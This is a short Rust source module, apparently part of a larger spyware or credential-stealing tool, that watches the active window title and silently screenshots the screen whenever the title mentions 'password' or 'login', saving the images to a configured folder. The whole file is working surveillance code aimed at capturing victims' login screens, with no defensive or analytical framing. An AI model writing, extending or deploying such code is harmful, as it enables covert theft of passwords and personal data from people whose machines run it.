use screenshots::Screen;
use std::fs;
use crate::window::get_active_window_title;
use crate::config::screenshot_dir;

pub fn take_screenshot_if_password() -> Option<String> {
    let title = get_active_window_title();
    if title.to_lowercase().contains("password") || title.to_lowercase().contains("login") {
        let screens = Screen::all().unwrap();
        for screen in screens {
            let image = screen.capture().unwrap();
            let timestamp = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs();
            let filename = format!("{}/screenshot_{}.png", screenshot_dir(), timestamp);
            fs::create_dir_all(screenshot_dir()).unwrap();
            image.save(&filename).unwrap();
            return Some(filename);
        }
    }
    None
}